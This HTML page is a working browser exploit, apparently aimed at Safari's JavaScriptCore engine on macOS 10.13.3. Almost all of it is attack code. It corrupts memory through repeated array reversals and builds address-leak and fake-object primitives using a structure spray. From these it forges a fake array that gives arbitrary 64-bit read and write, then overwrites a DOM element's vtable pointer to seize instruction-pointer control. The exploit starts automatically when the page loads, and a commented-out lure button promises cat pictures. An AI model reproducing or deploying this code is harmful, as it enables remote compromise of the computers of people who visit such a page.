<html>

<head>
    <script>
        var ALLOCS = 1000;

        var workbuf = new ArrayBuffer(0x1000000)
        var u32_buffer = new Uint32Array(workbuf)
        var u8_buffer = new Uint8Array(workbuf)

        function log(txt) {
            console.log(txt);
            // var c = document.createElement("div");
            // c.innerHTML = txt;
            // document.getElementById("log").appendChild(c);
        }

        function logtext(txt) {
            var c = document.createElement("div");
            c.innerHTML = txt;
            document.getElementById("log").appendChild(c);
        }
        var msg = "";

        function logmsg(txt) {
            msg += txt + "\n";
        }

        var print = log;
        var debug_alert = alert;
        var alert = logmsg;

        function makeJITCompiledFunction() {
            function target(x) {
                return x;
            }

            // Force JIT compilation.
            for (var i = 0; i < 1000; i++) {
                target(i);
            }

            return target;
        }

        function_to_shellcode = {}

        function make_jit_function() {
            func_body = "eval('');abc = [];"
            for (i = 0; i < 500; i++) {
                func_body += "abc[" + i.toString() + "];"
            }
            function_to_shellcode = new Function("a", func_body);
            // alert("here")
            for (i = 0; i < 100; i++) {
                function_to_shellcode();
            }
            // alert("here")
        }

        var _log0, _log, _dview;
        // wraps two uint32s into double precision
        function u2d(low, hi) {
            if (!_dview) _dview = new DataView(new ArrayBuffer(16));
            _dview.setUint32(0, hi);
            _dview.setUint32(4, low);
            return _dview.getFloat64(0);
        }

        // unwraps uints from double
        function d2u(d) {
            if (!_dview) _dview = new DataView(new ArrayBuffer(16));
            _dview.setFloat64(0, d);
            return {
                low: _dview.getUint32(4),
                hi: _dview.getUint32(0)
            };
        }

        var conversion_buffer = new ArrayBuffer(8)
        var f64 = new Float64Array(conversion_buffer)
        var i32 = new Uint32Array(conversion_buffer)

        var BASE32 = 0x100000000

        function f2i(f) {
            f64[0] = f
            return i32[0] + BASE32 * i32[1]
        }


        function i2f(i) {
            i32[0] = i % BASE32
            i32[1] = i / BASE32
            return f64[0]
        }

        function hex(x) {
            if (x < 0)
                return `-${hex(-x)}`
            return `0x${x.toString(16)}`
        }

        function xor(a, b) {
            var res = 0,
                base = 1
            for (var i = 0; i < 64; ++i) {
                res += base * ((a & 1) ^ (b & 1))
                a = (a - (a & 1)) / 2
                b = (b - (b & 1)) / 2
                base *= 2
            }
            return res
        }

        function fail(x) {
            print('FAIL ' + x)
            throw null
        }

        const outerArrayLength = 10000;
        const innerArrayLength = 128;

        var victim_arr = [];
        var victim = -1;
        var save = [0, 0];
        var round = -1;

        var target_func = makeJITCompiledFunction();
        //make_jit_function();

        var count = 0;

        function clearLog() {
            document.getElementById("log").innerHTML = '';
            msg = "";
        }

        function reloadPage() {
            window.location.reload()
        }

        var structure_spray = []

        function restart() {

            //reloadPage();
            count++;
            if (count % 10 == 0) {
                clearLog();
                count = 0;
            }
            //clearLog();
            victim_arr = 0;
            save = []
            console.log("restarting...");
            setTimeout(function () {
                trigger();
            }, 2000);
        }

        var sprayed = false;

        function sprayStructure() {
            if (sprayed) return;
            logtext("spraying structure....");
            for (var i = 0; i < 0x1000; ++i) {
                // Place 0x1000 as the last inlined property,
                // so we get a proper butterfly header when we use one of
                // these objects pointer as a butterfly.
                // Since all the objects allocated one after another from
                // some point, the last inlined property value is going to
                // act as a butterfly header with 0 used items and 0x1000 as length.

                // those properties are all inlined
                var ary = {
                    a: 1,
                    b: 2,
                    c: 3,
                    d: 4,
                    e: 5,
                    f: 6,
                    g: 7,
                    h: i2f(0x0000100000001000)
                }
                // supposedly this property goes to the butterfly
                ary['prop' + i] = 1
                structure_spray.push(ary)
            }
            sprayed = true;
        }

        function pwn(createArray) {

            logtext("pwning...");
            const limit = 5;

            for (let at = 0; at < limit; at++) {
                let arr = createArray();

                let v = [];
                for (let i = 0; i < 273; i++) {
                    for (let j = 0; j < 8; j++)
                        arr.reverse();

                    if (i == 156 - 1) {
                        v.push(0x44444440 + at);
                    } else {
                        v.push(new String("X").repeat(123008));
                        //v.push(new Array(0x1000).fill(0x41414141));
                    }
                }
                //print("checking at round: " + at);
                for (let i = 0; i < arr.length; i++) {

                    if (arr[i].length == undefined) {
                        console.log("undefined length at: " + i);
                        // sleep(1000);
                        print("undefined length!");
                        // Array.prototype.push.call(arr, "1");
                        //throw "failed!" 
                        restart();
                    }
                    if (arr[i].length != innerArrayLength) {
                        print("arr[" + i + "].length has changed from " + innerArrayLength + " to 0x" + arr[i].length.toString(
                            16));
                        //print(describeArray(arr));
                        if (arr[i].length - 0x44444440 >= 0) {
                            victim_arr = arr[i];
                            victim = i;
                            round = arr[i].length - 0x44444440;
                            print("found victim at round: " + round);
                            break;
                        } else {
                            restart();
                        }
                    }
                }
                if (victim != -1) {
                    print(hex(f2i(arr[victim][0])));
                    alert("victim: " + victim + ": " + hex(f2i(arr[victim][0])));
                }
                // let f = [];
                // for (let i = 0; i < 1000; i++)
                //    f.push(new Array(16).fill(0x42424242));

                save.push(arr);
                save.push(v);
                // save.push(f);


                if (victim >= 0) {
                    var addr_of = function (o) {
                        v[156] = o;
                        return victim_arr[0];
                    }
                    var fake_obj = function (f) {
                        victim_arr[0] = f;
                        return v[156];
                    }

                    var printaddr = function (name, obj) {
                        addr = addr_of(obj);
                        alert(name + " : " + hex(f2i(addr)));
                        a = d2u(addr);
                        print(name + " low: " + a.low.toString(16) + " ; high: " + a.hi);
                    }

                    print("round: " + round);
                    print("victim: " + victim);
                    printaddr("arr", arr);

                    printaddr("structure_spray", structure_spray);
                    var manager = structure_spray[500];
                    var leak_addr = f2i(addr_of(manager));
                    logtext("allocating above...");
                    // var unboxed_size = 100
                    function alloc_above_manager(expr) {
                        var res
                        do {
                            // for (var i = 0; i < ALLOCS; ++i) {
                            //     structure_spray.push(eval(expr))
                            // }

                            res = eval(expr)
                            structure_spray.push(res);
                        } while (addr_of(res) < leak_addr)
                        return res
                    }

                    // var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
                    // var boxed = alloc_above_manager('[{}]')
                    //var victimobj = alloc_above_manager('[]')

                    var victimobj = structure_spray[550]; // victimobj's address > manager's address
                    var victimobj_addr = f2i(addr_of(victimobj));
                    // if (victimobj_addr < leak_addr) {
                    //     debug_alert("checking failed");
                    //     restart();
                    // }
                    victimobj.prop550 = 0x1337;

                    function victim_write(val) {
                        victimobj.prop550 = val;
                    }

                    function victim_read() {
                        return victimobj.prop550;
                    }
                    //var leak_addr = stage1.addrof(manager)

                    printaddr("manager", manager);
                    printaddr("victimobj", victimobj);
                    // printaddr("unboxed", unboxed);
                    // printaddr("boxed", boxed);

                    i32[0] = 0x800;
                    i32[1] = 0x01082207 - 0x10000; // 10.13.3 Array JSCell, 07 is double shape
                    //i32[1] = 0x00001800 - 0x10000;
                    var container = {
                        // Inline object with indebufng type 8 and butterly pointing to hax.
                        // Later we will refer to it as fakearray.
                        jsCellHeader: f64[0],
                        butterfly: manager,
                    }

                    printaddr("container", container);
                    a = d2u(addr_of(container));
                    fake = fake_obj(u2d(a.low + 0x10, a.hi));
                    // i = 1;
                    // while (!(fake instanceof Float64Array)) {
                    //     i32[0] = i;
                    //     i32[1] = 0x01082207 - 0x10000; // 10.13.3 Float64 Array JSCell
                    //     //jsCellHeader = f64[0];
                    //     container.jsCellHeader = f64[0];
                    //     i++;
                    // }

                    printaddr("fake", fake);

                    //alert("fake length: " + fake.length);
                    alert("fake[2]: " + hex(f2i(fake[1])));
                    //fake[1] = i2f(0x45464748);
                    // alert((victimobj_addr + 8 - leak_addr) / 8)
                    var victimobj_butterfly = f2i(fake[(victimobj_addr + 8 - leak_addr) / 8]);
                    //var victimobj_butterfly = f2i(fake[1001]);
                    alert("victimobj_butterfly: " + hex(victimobj_butterfly));

                    function set_victim_addr(where) {
                        fake[(victimobj_addr + 8 - leak_addr) / 8] = i2f(where + 16);
                    }

                    function reset_victim_addr() {
                        fake[(victimobj_addr + 8 - leak_addr) / 8] = i2f(victimobj_butterfly);
                    }

                    function read64(where) {
                        set_victim_addr(where);
                        //alert("where: " + hex(where) + " data : " + victim_read())
                        var res = f2i(addr_of(victim_read()));
                        //reset_victim_addr();
                        //res = 0;
                        return res;
                    }

                    function write64(where, what) {
                        set_victim_addr(where);
                        victim_write(fake_obj(what));
                        //reset_victim_addr();
                    }

                    alert("check read64 victimobj_addr[0]: " + hex(read64(victimobj_addr + 8)))
                    write64(victimobj_addr + 16, i2f(0x45454545));
                    alert("check write64: " + hex(read64(victimobj_addr + 16)))

                    var wrapper = document.createElement("div");
                    printaddr("wrapper", wrapper)
                    var wrapper_addr = f2i(addr_of(wrapper));
                    var el_addr = read64(wrapper_addr + 24);
                    var vtable_addr = read64(el_addr);
                    alert("vtable_addr: " + hex(vtable_addr));

                    uint32array_addr = f2i(addr_of(u32_buffer))
                    printaddr("u32_buffer", u32_buffer)
                    for (let i = 0; i < 296 / 2; i += 2) {
                        u32_buffer[i] = 0xdeadbeef;
                        u32_buffer[i + 1] = 0x00000000;
                    }
                    uint32array_vector = read64(uint32array_addr + 16);
                    write64(el_addr, i2f(uint32array_vector));

                    // JIT ptr has been poisoned, cannot directly get the pointer and write shellcode to it
                    // printaddr("target_func", target_func);    
                    // func_addr = addr_of(target_func);
                    // addr = read64(f2i(func_addr) + 24);
                    // alert("addr: " + hex(addr))
                    // addr = read64(addr + 24);
                    // alert("addr: " + hex(addr))
                    // addr = read64(addr + 32);
                    // alert("addr: " + hex(addr))


                    // container = {
                    //     a: 0x1337
                    // };
                    // printaddr("container", container);
                    // fakearray = fake_obj(a.low, a.hi);
                    // printaddr("fakearray", fakearray);
                    // alert("check result:" + (fakearray.a == 0x1337))

                    // tried https://phoenhex.re/2017-05-04/pwn2own17-cachedcall-uaf with 2 Uint8Array
                    // but this is not available anymore, becore uint8array cell allocates 48 bytes
                    // the JSCell-4 is not the public length
                    /*
                    0x102275d80: 0x0008270000000114 0x0000000000000000
                    0x102275d90: 0x0000000102266760 0x000001ff00000100
                    0x102275da0: 0x0000000000000000 0x0000000000000000   // Cell Sise 48B, fake public length becomes 0, cannot set index quickly now
                    0x102275db0: 0x0008270000000114 0x0000000000000000
                    0x102275dc0: 0x00000001022668a0 0x000001ff00000100
                    0x102275dd0: 0x0000000000000000 0x0000000000000000
                    */
                    //fakearray[10] = hax2;
                    //sleep(100 * 1000);
                    debug_alert(msg);
                    debug_alert("finished, control RIP now...");

                    // control rip with 0xdeadbeef
                    wrapper.addEventListener('click', function () {})
                    //Array.prototype.slice.call([]);
                    break;
                }
            }
            restart();
        }

        function createArrayOfArrays() {
            //print("create array");
            let result = new Array(outerArrayLength);

            for (let i = 0; i < result.length; i++) {
                result[i] = new Array(innerArrayLength).fill(3.5448480588962e-310);
            }
            return result;
        }

        function trigger() {
            sprayStructure();
            pwn(createArrayOfArrays);
        }

        // alert("prepare");
        // setTimeout(trigger, 2000);
    </script>
</head>

<body onload="setTimeout(trigger, 2000);">
    <!-- <button onclick="trigger()">click here for cute cat picz!</button> -->
    <pre id="log"></pre>
</body>

</html>